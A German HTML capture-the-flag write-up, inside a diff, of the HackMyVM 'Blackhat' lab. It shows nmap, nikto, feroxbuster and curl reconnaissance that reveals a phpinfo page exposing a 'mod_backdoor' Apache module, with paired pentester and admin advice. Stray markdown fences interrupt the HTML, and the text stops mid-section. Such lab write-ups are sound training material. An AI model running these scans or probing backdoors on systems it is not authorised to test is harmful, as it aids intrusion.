@@ -1,1 +1,1506 @@
-﻿﻿﻿<html><body><h1>Test-Inhalt für Blackhat - HackMyVM - Easy.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blackhat - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+    <div class="header-bg">
+        <h1>Blackhat - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-easy">Easy</h2> <!-- CSS steuert die Farbe (Grün) -->
+            <div class="circle easy"> <!-- Klasse 'easy' für CSS-Steuerung der Segmentfarben (Grün) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- CSS steuert die Hintergrundfarbe (Header-Farbe) -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">python3 http.server</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">linpeas.sh</div>
+                <div class="tool-item">pspy64</div>
+                <div class="tool-item">Metasploit</div>
+                <div class="tool-item">suForce</div>
+                <div class="tool-item">nano</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                **Analyse:** Wie immer beginne ich meinen Pentest mit der Netzwerkerkennung, um die IP-Adresse des Zielsystems in meinem lokalen Netzwerk zu finden. Ich verwende `arp-scan` mit dem Parameter `-l`, um alle Hosts zu scannen, die auf ARP-Anfragen antworten. Die Ausgabe leite ich dann an `grep "PCS"` weiter, um nur Zeilen zu sehen, die den Hersteller "PCS Systemtechnik" enthalten, ein Hinweis auf die VirtualBox-Umgebung. Abschließend extrahiere ich mit `awk '{print $1}'` die erste Spalte, die die IP-Adresse enthält.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dieser schnelle Scan lieferte direkt die IP-Adresse des Zielsystems, 192.168.2.34. Die Erkennung des Herstellers "PCS" ist hilfreich, um die Testumgebung zu identifizieren. Die Methode ist effizient für die Discovery von Hosts in einem bekannten lokalen Netzwerk.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Bei der Durchführung von Tests in lokalen Netzwerken ist `arp-scan` ein schnelles und zuverlässiges Tool zur Identifizierung aktiver Hosts.
+                <br>**Empfehlung (Admin):** Überwachen Sie ARP-Traffic auf ungewöhnliche Anfragen von unbekannten MAC-Adressen. Segmentieren Sie Netzwerke, um die Reichweite von Layer-2-Discovery-Tools zu begrenzen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.34</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Um die Arbeit mit dem Zielsystem zu erleichtern und anstelle der IP-Adresse einen Hostnamen verwenden zu können, trage ich die gefundene IP-Adresse und den erwarteten Hostnamen `blackhat.hmv` in meine lokale `/etc/hosts` Datei ein. Ich nutze den `vi` Editor, um die Datei zu öffnen und die entsprechende Zeile hinzuzufügen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Anpassen der hosts-Datei ist ein bewährtes Verfahren, um die Lesbarkeit von Befehlen und Skripten während des Pentests zu verbessern und sicherzustellen, dass Tools, die auf Hostnamen basieren, korrekt funktionieren. Es ist keine sicherheitsrelevante Aktion auf dem Zielsystem, sondern eine lokale Konfiguration auf meiner Angreifer-Maschine.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Fügen Sie Zielsysteme immer zu Ihrer hosts-Datei hinzu, sobald die IP-Adresse bekannt ist. Dies optimiert den Workflow und die Skripting-Fähigkeiten.
+                <br>**Empfehlung (Admin):** Dieser Schritt hat keine direkten Auswirkungen auf die Sicherheit des Zielsystems, da er auf der Angreiferseite durchgeführt wird.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">vi /etc/hosts</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+  <span class="command">192.168.2.34    blackhat.hmv</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Als nächstes führe ich einen umfassenden Portscan des Zielsystems mit Nmap durch. Ich verwende die Optionen `-sS` (SYN-Scan), `-sC` (Ausführung von Standard-Skripten), `-sV` (Versionserkennung), `-p-` (Scan aller 65535 Ports), `-T5` (aggressives Timing) und `-AO` (OS-Erkennung und alle aktivierten Features). Der erste Befehl `nmap ... | grep open` filtert die Ausgabe, um schnell einen Überblick über alle offenen Ports zu erhalten.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der gefilterte Nmap-Output zeigt, dass auf dem Zielsystem nur Port 80 (HTTP) offen ist. Dies konzentriert meine weitere Analyse stark auf die Webanwendung. Die Identifizierung von Apache httpd 2.4.54 auf Debian gibt mir die spezifische Softwareversion, nach der ich suchen kann. Das Fehlen anderer offener Ports wie SSH (22) oder anderer Dienste deutet darauf hin, dass der primäre Angriffsvektor über den Webserver erfolgen muss.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Beginnen Sie die Enumeration des Zielsystems immer mit einem vollständigen Portscan. Das Filtern der offenen Ports gibt einen schnellen Überblick. Konzentrieren Sie sich bei nur wenigen offenen Ports auf diese spezifischen Dienste.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass nur die absolut notwendigen Ports und Dienste auf dem System offen sind. Filtern Sie eingehenden Traffic auf nicht benötigte Ports mit einer Firewall.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.34 |grep open</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">80/tcp open  http    Apache httpd 2.4.54 ((Debian))</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Hier dokumentiere ich die vollständige Ausgabe des Nmap-Scans. Sie bestätigt den offenen Port 80 mit Apache httpd 2.4.54 auf Debian. Die Standard-Skripte liefern weitere Details: den `http-server-header`, der die Apache-Version wiederholt, und den `http-title`, der "Hacked By HackMyVM" lautet. Dies könnte ein Hinweis darauf sein, dass die Maschine absichtlich so konfiguriert ist oder dass die Index-Seite bereits verändert wurde. Die OS-Erkennung ist sich nicht ganz sicher, schätzt aber stark auf Linux (Debian-basiert), was zur Apache-Version passt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Nmap-Ausgabe liefert entscheidende Informationen für den nächsten Schritt. Die genaue Apache-Version ist ein Ziel für die Suche nach bekannten Schwachstellen. Der HTTP-Titel ist ein interessanter, wenn auch nicht direkt ausnutzbarer, Hinweis. Die wahrscheinliche Identifizierung als Debian-Linux ist nützlich für die spätere Privilege Escalation. Da nur Port 80 offen ist, wird die gesamte weitere Anstrengung auf die Webanwendung gerichtet sein.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Überprüfen Sie die spezifische Apache-Version auf bekannte CVEs (Common Vulnerabilities and Exposures). Notieren Sie sich den HTTP-Titel – manchmal enthält er versteckte Hinweise.
+                <br>**Empfehlung (Admin):** Aktualisieren Sie Webserver-Software (Apache) regelmäßig auf die neueste Version, um bekannte Schwachstellen zu schließen. Minimieren Sie die Informationen in Server-Headern und im HTTP-Titel.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.34</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 22:13 CEST</span>
+Nmap scan report for blackhat.hmv (192.168.2.34)
+<span class="password">Host is up (0.00022s latency).</span>
+Not shown: 65534 closed tcp <span class="command">ports</span> (reset)
+<span class="command">PORT   STATE SERVICE VERSION</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.54 ((Debian))</span>
+<span class="command">|_http-server-header: Apache/2.4.54 (Debian)</span>
+<span class="command">|_http-title:  Hacked By HackMyVM</span>
+<span class="command">MAC Address: 08:00:27:67:A9:1C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+<span class="command">Aggressive OS guesses: Linux 4.15 - 5.19 (97%), OpenWrt 21.02 (Linux 5.4) (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 6.0 (96%), Linux 2.6.32 (95%), Linux 4.19 (95%), Linux 3.2 - 4.14 (95%), Linux 2.6.32 - 3.10 (95%), Linux 5.0 - 5.14 (95%), Linux 4.15 (95%)</span>
+<span class="command">No exact OS matches for host (test conditions non-ideal).</span>
+Network Distance: 1 hop
+
+<span class="command">TRACEROUTE</span>
+<span class="command">HOP RTT     ADDRESS</span>
+<span class="command">1   0.22 ms blackhat.hmv (192.168.2.34)</span>
+
+<span class="password">OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .</span>
+<span class="password">Nmap done: 1 IP address (1 host up) scanned in 13.76 seconds</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich verwende Nikto, einen weit verbreiteten Webserver-Scanner, um die Webanwendung auf Port 80 auf bekannte Schwachstellen, veraltete Software, Konfigurationsfehler und andere Probleme zu scannen. Der Befehl `nikto -h http://blackhat.hmv` richtet den Scan auf den Hostnamen des Ziels.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Nikto hat einige interessante Ergebnisse geliefert. Es bestätigt den Apache-Server und listet wie erwartet fehlende Sicherheits-Header auf (`X-Frame-Options`, `X-Content-Type-Options`). Ein wichtiger Hinweis ist die mögliche Preisgabe von Inodes über ETags, was in bestimmten Szenarien ausgenutzt werden könnte. Entscheidend sind jedoch die gefundenen Einträge: `/phpinfo.php`. Nikto hat eine phpinfo()-Datei gefunden und meldet dies als kritische Informationspreisgabe (`CWE-552`), da eine phpinfo-Seite sehr detaillierte Informationen über die PHP-Konfiguration des Servers preisgibt. Die erlaubten HTTP-Methoden (GET, POST, OPTIONS, HEAD) sind Standard und stellen keine unmittelbare Schwachstelle dar.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die gefundene `phpinfo.php` sofort aufrufen und analysieren. Sie enthält potenziell kritische Informationen für weitere Angriffe.
+                <br>**Empfehlung (Admin):** Entfernen Sie die Datei `phpinfo.php` von Produktionsservern. Implementieren Sie alle empfohlenen Sicherheits-Header. Überprüfen Sie die Konfiguration des Webservers auf ungewollte Informationspreisgabe (z.B. Verzeichnisslistings, detaillierte Fehlermeldungen).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nikto -h http://blackhat.hmv</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">- Nikto v2.5.0</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.34</span>
+<span class="command">+ Target Hostname:    blackhat.hmv</span>
+<span class="command">+ Target Port:        80</span>
+<span class="password">+ Start Time:         2025-06-09 22:13:17 (GMT2)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Server: Apache/2.4.54 (Debian)</span>
+<span class="password">+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
+<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
+<span class="password">+ /: Server may leak inodes via ETags, header found with file /, inode: 59d, size: 5edce4c6f946a, mtime: gzip. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418]</span>
+<span class="command">+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .</span>
+<span class="password">+ /phpinfo.php: Output from the phpinfo() function was found.</span>
+<span class="password">+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: [Link: CWE-552 | Ziel: CWE-552]</span>
+<span class="password">+ 7962 requests: 0 error(s) and 6 item(s) reported on remote host</span>
+<span class="password">+ End Time:           2025-06-09 22:13:26 (GMT2) (9 seconds)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="password">+ 1 host(s) tested</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich dokumentiere das Aussehen der Startseite (`index.html`). Das Bild zeigt, dass die Seite den Titel "Hacked By HackMyVM" trägt, was die Information aus dem Nmap-Scan visuell bestätigt. Die Seite hat wahrscheinlich ein simples HTML-Layout mit einem Bild.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Startseite scheint keine interaktive Funktionalität zu bieten. Der Titel deutet darauf hin, dass dies absichtlich eine "gehackte" Seite simuliert, was für ein Capture-The-Flag (CTF) Szenario typisch ist. Die Seite selbst liefert keine offensichtlichen Angriffspunkte oder Eingabefelder, die direkt getestet werden könnten, abgesehen von der Struktur der URL.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Den Source Code der index.html sorgfältig prüfen, um versteckte Hinweise oder Links zu finden, da die Oberfläche selbst wenig hergibt.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass die Standard-Indexseite keine unnötigen Informationen enthält oder auf interne Ressourcen verweist.
+            </p>
+             <img src="index.html_front.jpg" alt="hier sieht man die front page ansicht von index.html">
+             <p class="analysis">Bildbeschreibung: hier sieht man die front page ansicht von index.html</p>
+
+            <p class="analysis">
+                **Analyse:** Ich betrachte den Source Code der `index.html` Seite. Das Bild im Bericht zeigt, dass die Seite versucht, das Anzeigen des Source Codes über die Tastenkombination Strg+U mit JavaScript zu blockieren. Im Source Code finde ich einen HTML-Kommentar, der einen Hinweis enthält: "check backboor....". Dies scheint ein Tippfehler für "check backdoor" zu sein.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Hinweis im Source Code ist ein entscheidender Fund! "backdoor" deutet stark auf eine absichtlich eingebaute, versteckte Funktionalität hin, die wahrscheinlich einen Hintertürcode auf dem Server ausführt. Das Blocking von Strg+U mit JavaScript ist ein Versuch, diesen Hinweis vor neugierigen Augen zu verbergen, was aber leicht umgangen werden kann (z.B. durch Deaktivieren von JavaScript oder Betrachten des Source Codes über `view-source:` im Browser).
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Untersuchen Sie den Begriff "backdoor" im Kontext der zuvor gefundenen `phpinfo.php`. Suchen Sie nach einem versteckten Parameter oder HTTP-Header, der diesen Backdoor-Mechanismus aktivieren könnte. Ignorieren Sie clientseitige Schutzmechanismen wie JavaScript-Blocking für Source Code.
+                <br>**Empfehlung (Admin):** Vermeiden Sie es, versteckte Hinweise oder Zugänge im öffentlich zugänglichen Source Code zu hinterlassen, auch in HTML-Kommentaren. Clientseitiges JavaScript-Blocking ist keine Sicherheitsmaßnahme.
+
+            </p>
+             <img src="index.html_sourcecode_js_blockt_strg+u.jpg" alt="hier sieht man den sourcecode von index.html der mit js strg + u tastenkombi blocken will...">
+             <p class="analysis">Bildbeschreibung: hier sieht man den sourcecode von index.html der mit js strg + u tastenkombi blocken will...</p>
+             <pre>
+der index.html sourcecode verbirgt einen Hinweis mit:<span class="command">check backboor....</span>
+</pre>
+
+            <p class="analysis">
+                **Analyse:** Um weitere versteckte Dateien oder Verzeichnisse auf dem Webserver zu finden, setze ich das Fuzzing-Tool `feroxbuster` ein. Ich ziele auf die URL `http://blackhat.hmv`, verwende die gängige Wordlist `directory-list-2.3-medium.txt` und erweitere sie mit einer Liste von Dateierweiterungen (`-x .git,.php,...`) um spezifische Dateitypen zu finden. Ich filtere die Ergebnisse, um nur Statuscodes 200 (OK), 301 (Moved Permanently) und 302 (Found) anzuzeigen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Feroxbuster lieferte mehrere Treffer mit Status 200. Es fand die Indexseite (`/` und `/index.html`), die CSS-Datei (`/style.css`) und das Bild (`/image.jpg`), was die visuelle Darstellung bestätigt. Am wichtigsten ist jedoch der Fund von `/phpinfo.php`, was die Nikto-Ergebnisse bestätigt und eine kritische Seite für die weitere Enumeration darstellt. Die Laufzeit und Anzahl der Anfragen zeigen, dass ein gründlicher Scan durchgeführt wurde.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Fuzzing ist ein unverzichtbarer Schritt bei der Web-Enumeration, um versteckte oder nicht verlinkte Ressourcen zu finden. Kombinieren Sie Wordlists mit relevanten Dateierweiterungen.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass keine sensiblen Dateien (wie phpinfo.php, Backup-Dateien, Konfigurationsdateien, Quellcode-Repositories) im Webroot oder öffentlich zugänglichen Verzeichnissen liegen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">feroxbuster --url "http://blackhat.hmv" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+ <span class="command">___  ___  __   __     __      __         __   ___</span>
+<span class="command">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span>
+<span class="command">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span>
+<span class="command">by Ben "epi" Risher 🤓                 ver: 2.11.0</span>
+───────────────────────────┬──────────────────────
+ 🎯  <span class="command">Target Url            │ http://blackhat.hmv</span>
+ 🚀  <span class="command">Threads               │ 50</span>
+ 📖  <span class="command">Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+ 👌  <span class="command">Status Codes          │ [200, 301, 302]</span>
+ 💥  <span class="command">Timeout (secs)        │ 7</span>
+ 🦡  <span class="command">User-Agent            │ feroxbuster/2.11.0</span>
+ 💉  <span class="command">Config File           │ /etc/feroxbuster/ferox-config.toml</span>
+ 🔎  <span class="command">Extract Links         │ true</span>
+ 💲  <span class="command">Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
+ 🏁  <span class="command">HTTP methods          │ [GET]</span>
+ 🔃  <span class="command">Recursion Depth       │ 4</span>
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+<span class="command">200      GET       43l      326w    23804c http://blackhat.hmv/image.jpg</span>
+<span class="command">200      GET      127l      263w     2332c http://blackhat.hmv/style.css</span>
+<span class="command">200      GET       62l      121w     1437c http://blackhat.hmv/</span>
+<span class="command">200      GET       62l      121w     1437c http://blackhat.hmv/index.html</span>
+<span class="command">200      GET      769l     4038w    69310c http://blackhat.hmv/phpinfo.php</span>
+<span class="password">[####################] - 7m   6175484/6175484 0s      found:5       errors:2</span>
+<span class="password">[####################] - 7m   6175288/6175288 15139/s http://blackhat.hmv/</span>
+</pre>
+                </div>
+            </div>
+
+        </section>
+```
+
+**Teil 2 von 3**
+
+```html
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                **Analyse:** Ich verwende `curl` mit den Optionen `-Iv` (Include Header, Verbose) auf der Root-URL `http://192.168.2.34`, um die HTTP-Antwort-Header der Startseite zu inspizieren. Dies gibt mir detaillierte Informationen über die Kommunikation mit dem Server.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Ausgabe bestätigt den HTTP/1.1 200 OK Status und den Server (`Apache/2.4.54`). Der `Content-Type: text/html` und die `Content-Length: 1437` bestätigen die Größe und Art der Seite. Die Header `Last-Modified` und `ETag` sind standardmäßig vorhanden und geben Zeit- und Versionsinformationen der Datei, die für Cache-Validierung verwendet werden. Nikto hatte bereits angemerkt, dass ETags potenziell Inode-Informationen preisgeben können (CVE-2003-1418), was aber hier im Kontext dieses Tests keine direkte Ausnutzung ermöglicht. Wichtiger ist die Bestätigung der grundlegenden Server-Antwort.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Überprüfen Sie immer die rohen HTTP-Header auf zusätzliche Informationen oder ungewöhnliches Verhalten. Die Content-Length kann nützlich sein, um bei Fuzzing-Angriffen Standardantworten zu filtern.
+                <br>**Empfehlung (Admin):** Minimieren Sie die Informationen in HTTP-Headern, insbesondere ETag-Werte, falls diese sensible Informationen preisgeben könnten. Konfigurieren Sie den Server so, dass er nur notwendige Header sendet.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl -Iv http://192.168.2.34</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+*   <span class="password">Trying 192.168.2.34:80...</span>
+* <span class="password">Connected to 192.168.2.34 (192.168.2.34) port 80</span>
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Host: 192.168.2.34
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* <span class="password">Request completely sent off</span>
+<span class="password">< HTTP/1.1 200 OK</span>
+<span class="command">HTTP/1.1 200 OK</span>
+<span class="command">< Date: Mon, 09 Jun 2025 20:22:45 GMT</span>
+<span class="command">Date: Mon, 09 Jun 2025 20:22:45 GMT</span>
+<span class="command">< Server: Apache/2.4.54 (Debian)</span>
+<span class="command">Server: Apache/2.4.54 (Debian)</span>
+<span class="command">< Last-Modified: Sat, 19 Nov 2022 08:06:24 GMT</span>
+<span class="command">Last-Modified: Sat, 19 Nov 2022 08:06:24 GMT</span>
+<span class="command">< ETag: "59d-5edce4c6f946a"</span>
+<span class="command">ETag: "59d-5edce4c6f946a"</span>
+<span class="command">< Accept-Ranges: bytes</span>
+<span class="command">Accept-Ranges: bytes</span>
+<span class="command">< Content-Length: 1437</span>
+<span class="command">Content-Length: 1437</span>
+<span class="command">< Vary: Accept-Encoding</span>
+<span class="command">Vary: Accept-Encoding</span>
+<span class="command">< Content-Type: text/html</span>
+<span class="command">Content-Type: text/html</span>
+< 
+
+* <span class="password">Connection #0 to host 192.168.2.34 left intact</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich führe einen `curl -Iv` Befehl speziell auf die von Nikto gefundene `phpinfo.php` Seite aus, um deren Header zu überprüfen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Antwort ist HTTP/1.1 200 OK, was bestätigt, dass die Seite direkt zugänglich ist. Die Header zeigen ebenfalls den Apache-Server und den `Content-Type: text/html`, diesmal mit charset UTF-8. Die Header-Analyse bestätigt nur die Existenz und Erreichbarkeit, aber die eigentlichen kritischen Informationen liegen im Body der phpinfo-Seite.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nach der Header-Analyse muss der Inhalt der `phpinfo.php` Seite selbst detailliert untersucht werden.
+                <br>**Empfehlung (Admin):** Entfernen Sie die `phpinfo.php` Datei, da sie unnötige und potenziell gefährliche Systemdetails preisgibt.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl -Iv http://192.168.2.34/phpinfo.php</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+*   <span class="password">Trying 192.168.2.34:80...</span>
+* <span class="password">Connected to 192.168.2.34 (192.168.2.34) port 80</span>
+* using HTTP/1.x
+> HEAD /phpinfo.php HTTP/1.1
+> Host: 192.168.2.34
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* <span class="password">Request completely sent off</span>
+<span class="password">< HTTP/1.1 200 OK</span>
+<span class="command">HTTP/1.1 200 OK</span>
+<span class="command">< Date: Mon, 09 Jun 2025 20:23:45 GMT</span>
+<span class="command">Date: Mon, 09 Jun 2025 20:23:45 GMT</span>
+<span class="command">< Server: Apache/2.4.54 (Debian)</span>
+<span class="command">Server: Apache/2.4.54 (Debian)</span>
+<span class="command">< Content-Type: text/html; charset=UTF-8</span>
+<span class="command">Content-Type: text/html; charset=UTF-8</span>
+< 
+
+* <span class="password">Connection #0 to host 192.168.2.34 left intact</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich rufe die `phpinfo.php` Seite im Browser auf, um ihren Inhalt zu sehen und nach Hinweisen zu suchen. Das Bild im Bericht zeigt einen relevanten Abschnitt unter "Configuration / apache2handler", wo der Eintrag `mod_backdoor` zu sehen ist. Dieser Modulname ist sehr ungewöhnlich und sicher kein Standardbestandteil von Apache.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Kritischer Fund!** Die Existenz eines Apache-Moduls namens `mod_backdoor` ist ein sehr starker Hinweis auf eine absichtlich eingebaute Hintertür. In CTFs wird so etwas oft für Remote Code Execution (RCE) verwendet. Die Kombination des Hinweises "check backboor" aus dem `index.html` Source Code und des `mod_backdoor` Eintrags in der `phpinfo.php` ist eindeutig – es gibt eine Backdoor auf dem System, die über den Webserver zugänglich ist.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Untersuchen Sie, wie `mod_backdoor` aktiviert und gesteuert wird. Suchen Sie in der `phpinfo()` Ausgabe nach ungewöhnlichen Umgebungsvariablen, Apache-Direktiven oder PHP-Einstellungen, die mit diesem Modul in Verbindung stehen könnten. Testen Sie das Senden von Anfragen mit ungewöhnlichen HTTP-Headern oder Parametern.
+                <br>**Empfehlung (Admin):** **Dringend:** Untersuchen Sie das `mod_backdoor` Modul, entfernen Sie es, wenn es nicht explizit und sicher benötigt wird. Überprüfen Sie alle installierten Apache-Module und ihre Konfigurationen auf unbekannte oder verdächtige Einträge.
+            </p>
+            <p>
+                Analyse der `phpinfo.php` Seite und Entdeckung von `mod_backdoor`:
+            </p>
+            <pre>
+<span class="command">http://192.168.2.34/phpinfo.php</span>
+</pre>
+            <img src="info_backdoor.jpg" alt="hier sieht man in der phpinfo unter Configuration/apache2handler den Eintrag:mod_backdoor">
+            <p class="analysis">Bildbeschreibung: hier sieht man in der phpinfo unter Configuration/apache2handler den Eintrag:mod_backdoor</p>
+
+            <p class="analysis">
+                **Analyse:** Basierend auf dem Fund von `mod_backdoor` und dem Hinweis "check backdoor", konzentriere ich mich auf die Analyse weiterer relevanter Informationen in der `phpinfo.php` Seite. Insbesondere prüfe ich die PHP-Konfigurationen `disable_functions` und `ffi.enable`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die `disable_functions` Liste zeigt, dass viele `pcntl_` Funktionen deaktiviert sind. Das ist eine grundlegende Sicherheitsmaßnahme, um die Ausführung von Systembefehlen aus PHP heraus einzuschränken. Wichtig ist jedoch, dass kritische Funktionen wie `system`, `shell_exec`, `passthru`, `exec` (im Gegensatz zu `pcntl_exec`) und `proc_open` *nicht* deaktiviert sind. Dies bedeutet, dass RCE über PHP, falls eine Injection-Schwachstelle gefunden wird, immer noch möglich ist. Der Eintrag `ffi.enable = preload` im FFI-Abschnitt ist ebenfalls sehr interessant. Dies deutet darauf hin, dass PHP FFI (Foreign Function Interface) aktiv ist und im "preload"-Modus konfiguriert ist. FFI kann, wenn falsch konfiguriert oder in Kombination mit Dateiuploads, für RCE missbraucht werden, indem eine bösartige Shared Library zur Laufzeit geladen wird. Dies ist ein potenziell fortgeschrittener PE-Vektor.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Notieren Sie sich die nicht deaktivierten PHP-Funktionen für RCE-Paylaods. Halten Sie den FFI-preload-Mechanismus als möglichen fortgeschrittenen Vektor für Privilege Escalation oder RCE im Hinterkopf, falls einfachere Methoden fehlschlagen.
